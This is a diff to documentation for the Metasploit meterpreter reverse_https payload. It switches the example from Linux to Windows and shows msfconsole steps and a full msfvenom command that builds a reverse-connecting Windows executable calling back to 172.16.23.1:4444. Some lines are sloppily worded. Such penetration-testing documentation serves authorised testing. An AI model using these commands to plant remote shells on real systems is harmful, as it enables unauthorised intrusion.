@@ -56,13 +56,13 @@ set TARGET [index]
 To actually set the payload:
 
 1. In msfconsole, load the exploit.
-2. Do: ```set PAYLOAD linux/x86/meterpreter/reverse_https```
+2. Do: ```set PAYLOAD windows/meterpreter/reverse_https```
 3. Set the ```LHOST``` OPTION WHICH, which [IP the same the payload connect to](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit).
 4. Run th exploit
 
 **As a standalone**
 
-To generate linux/x86/meterpreter/reverse_https, you can do this from msfvenom:
+To generate windows/meterpreter/reverse_https, you can do this from msfvenom:
 
 ```
 ./msfvenom -p windows/meterpreter/reverse_https lhost=172.16.23.1 lport=4444 -f exe -o /tmp/https.exe
